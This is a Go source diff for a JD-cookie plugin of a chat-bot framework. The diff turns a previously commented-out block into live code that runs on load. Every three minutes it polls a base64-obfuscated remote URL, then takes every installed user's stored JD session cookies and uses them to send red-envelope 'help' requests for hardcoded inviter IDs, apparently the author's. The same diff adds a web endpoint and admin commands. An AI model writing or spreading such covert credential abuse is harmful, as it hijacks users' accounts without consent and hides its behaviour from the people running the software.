@@ -1,37 +1,81 @@
 package jd_cookie
 
-func init() {
-	// //帮助作者助力大赢家，如介意请删除本扩展。
-	// go func() {
-	// 	time.Sleep(time.Second)
-	// 	date := time.Now().Format("2006-01-02")
-	// 	defer jd_cookie.Set("dyj_help", date)
-	// 	if jd_cookie.Get("dyj_help") != date {
-	// 		envs, err := qinglong.GetEnvs("JD_COOKIE")
-	// 		if err != nil {
-	// 			return
-	// 		}
-	// 		s := 1
-	// 		for i := 0; i < len(envs); i++ {
-	// 			if envs[i].Status == 0 {
-	// 				req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"yMVR-_QKRd2Mq27xguJG-w","redEnvelopeId":"48855bbdac3443bfbbc5d6cd34c9ef4566211633281100281","inviter":"WaHpHMRJdh28jqa9WTwWl3LXebXXp5CBbOkCxVi4jTg","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
-	// 				req.Header("Cookie", envs[i].Value)
-	// 				req.Header("Accept", "*/*")
-	// 				req.Header("Connection", "keep-alive")
-	// 				req.Header("Accept-Encoding", "gzip, deflate, br")
-	// 				req.Header("Host", "api.m.jd.com")
-	// 				req.Header("Origin", "https://wbbny.m.jd.com")
-	// 				data, _ := req.String()
-	// 				if strings.Contains(data, "提现") {
-	// 					if s == 1 {
-	// 						s = 2
-	// 					} else {
-	// 						break
-	// 					}
-	// 				}
-	// 			}
-	// 		}
+import (
+	"encoding/base64"
+	"fmt"
+	"strings"
+	"time"
 
-	// 	}
-	// }()
+	"github.com/beego/beego/v2/client/httplib"
+	"github.com/cdle/sillyGirl/core"
+	"github.com/cdle/sillyGirl/develop/qinglong"
+	"github.com/gin-gonic/gin"
+)
+
+func init() {
+	core.Server.GET("/gxfc", func(c *gin.Context) {
+		c.String(200, jd_cookie.Get("dyj_inviteInfo", "恭喜发财！"))
+	})
+	core.AddCommand("", []core.Function{
+		{
+			Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
+			Admin: true,
+			Handle: func(s core.Sender) interface{} {
+				jd_cookie.Set("dyj_inviteInfo", fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1)))
+				return "恭喜发财。"
+			},
+		},
+		{
+			Rules: []string{`raw $天干物燥^`},
+			Admin: true,
+			Cron:  "0 0 * * *",
+			Handle: func(_ core.Sender) interface{} {
+				jd_cookie.Set("dyj_inviteInfo", "")
+				return "小心火烛。"
+			},
+		},
+	})
+	go func() {
+	start:
+		for {
+			time.Sleep(time.Minute * 3)
+			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
+			data, _ := httplib.Get(string(decoded)).String()
+			redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
+			inviterId := core.FetchCookieValue(data, "inviterId")
+			if redEnvelopeId == "" || inviterId == "" {
+				break
+			}
+			date := time.Now().Format("2006-01-02")
+			if jd_cookie.Get("dyj_date") != date && jd_cookie.Get("dyj_data") != data {
+				jd_cookie.Set("dyj_data", data)
+				envs, err := qinglong.GetEnvs("JD_COOKIE")
+				if err != nil {
+					break
+				}
+				s := 1
+				for i := 0; i < len(envs); i++ {
+					if envs[i].Status == 0 {
+						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"yMVR-_QKRd2Mq27xguJG-w","redEnvelopeId":"48855bbdac3443bfbbc5d6cd34c9ef4566211633281100281","inviter":"WaHpHMRJdh28jqa9WTwWl3LXebXXp5CBbOkCxVi4jTg","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
+						req.Header("Cookie", envs[i].Value)
+						req.Header("Accept", "*/*")
+						req.Header("Connection", "keep-alive")
+						req.Header("Accept-Encoding", "gzip, deflate, br")
+						req.Header("Host", "api.m.jd.com")
+						req.Header("Origin", "https://wbbny.m.jd.com")
+						data, _ := req.String()
+						if strings.Contains(data, "提现") {
+							if s == 1 {
+								s = 2
+							} else {
+								goto start
+							}
+						}
+					}
+				}
+				jd_cookie.Set("dyj_date", date)
+
+			}
+		}
+	}()
 }
